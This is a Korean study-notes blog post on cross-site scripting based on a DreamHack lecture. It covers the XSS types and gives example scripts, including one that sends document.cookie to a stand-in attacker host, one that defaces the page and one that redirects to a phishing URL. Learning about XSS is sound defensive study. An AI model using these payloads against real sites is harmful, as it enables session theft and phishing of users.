---
layout: single
title:  "ClientSide : XSS"
categories: DreamHack
tag: [DreamHack, WebHacking, XSS]
toc: true
author_profile: false
---

# ClientSide : XSS

[ClientSide : XSS](https://dreamhack.io/lecture/courses/173)

클라이언트 사이드 취약점은 웹페이지 이용자를 대상으로 공격할 수 있는 취약점이다. 세션과 쿠키 정보를 탈취해 해당 계정을 악용할 수 있다.

오늘은 클라이언트 사이드 취약점의 대표적인 공격인 Cross Site Scripting(XSS)의 종류와 어떠한 상황에서 일어나는지 공부한다.


[Cross Site Scripting 의 약어는 CSS가 정상이지만 html을 꾸밀때 사용되는 CSS와 혼돈을 피하기 위해 XSS를 사용한다]

## XSS

XSS는 공격자가 웹 리소스에 악성 스크립트를 삽입해 이용자의 웹 브라우저에서 그 스크립트를 실행할 수 있습니다. 공격자는 스 스크립트를 이용해 세션 정보를 얻어 해당 계정으로 임의의 기능을 수행할 수 있다.

----
예) 

드림핵 사이트에서 XSS취약점 발견

공격자가 오리진 권한으로 악성 스크립트 삽입

이용자가 악성 스크립트가 포함된 페이지 방문

스크립트가 실행후 쿠키 및 세션 탈취

-----

해당 취약점은 SOP 보안정책이 등장하면서 힘들어 졌지만, 이를 우회ㅘ는 다양한 기술이 나오면서 XSS 공격은 지속되고 있다

### XSS 발생 예시와 종류

XSS 공격은 이용자가 삽입한 내용을 출력하는 기능에서 발생한다. XSS는 발생 형태에 따라서 다양한 종류로 구분된다.

|종류|설명|
|---|---|
|Stored XSS|악성 스크립트가 <U>서버</U>에 저장되고 <U>서버</U>의 응답에 담겨오는 XSS|
|Reflected XSS|악성 스크립트가 <U>URL</U>에 삽입되고서 <U>서버</U>의 응답에 담겨오는 XSS|
|DOM-based XSS| 악성스크립트가 <U>URL Fragment</U>에 삽입되는 XSS|
|Universal XSS|클라이언트의 브라우저 혹은 브라우저의 플러그인에서 발생하는 취약점으로 SOP우회하는 XSS|

### XSS 스크립트의 예시

1. 쿠키 및 세션 탈취 공격 코드
   
 ```html
<script>
    alert("hello");
    //"hello 문자열 alert 실행
    document.cookie;
    //현재 페이지의 쿠키 
    //(return type : string)
    alert(document.cookie);
    //현재 페이지의 쿠키를 alert 실행
    document.cookie = "name=test;";
    //쿠키 생성
    //new Image()는 이미지를 생성하는 함수, src는 이미지의 주소를 지정
    //"http://hacker.dreamhack.io/?cookie=현재페이지의 쿠키" 주소를 요청해 공격자 주소로 현재 페이지의 쿠키 요청
    new Image().src = "http://hacker.dreamhack.io/?cookie=" + document.cookie;

</script>

   ```

2. 페이지 변조 공격 코드

```html
<script>
    document;
    // 이용자의 페이지 정보 접근
    document.write("Hacked By DreamHack !");
    //이용자의 페이지에 데이터를 삽입
</script>
```
3. 위치 이동 공격 코드

```html
<script>
    location.href = "http://hacker.dreamhack.io.phishing";
    //이용자의 위치를 변경
    //피싱 공격 등으로 사용됨
    
    window.open("hrrp://hacker.dreamhack.io/")
    //새 창 열기
</script>
```

### Stored XSS

Stored XSS는 서버의 데이터베이스 또는 파일 등의 형태로 저장된 악성 스크립트를 조회할 때 발생하는 XSS이다.

대표적으로 게시물과 댓글에 악성 스크립트를 포함해 업로드 하는 방식이 있다.

게시물의 내용을 그대로 출력하는 모듈일 경우 < script > 태그나 HTML 태그를 삽입해서 Stored XSS 발생시킬수 있다.

### Reflected XSS

Reflected XSS는 서버가 악성 스크립트가 담긴 요청을 출력할때 발생한다. 대표적으로 게시물을 조회하기 위한 검색창에서 스크립트를 포함하는 방식이 있다.

Reflected XSS 는 Stored XSS와 다르게 URL과 같은 이용자의 요청에서 발생한다. 공격을 유도하기 위해서는 타 이용자에게 악성 스크립트가 포함된 링크에 접속하도록 유도해야한다.

이용자에게 링크를 직접전달하는 방법은 이용자가 눈치챌 수 있기 때문에 주로 Click Jacking 또는 Open Redirect등 다른 취약점과 연계해서 사용한다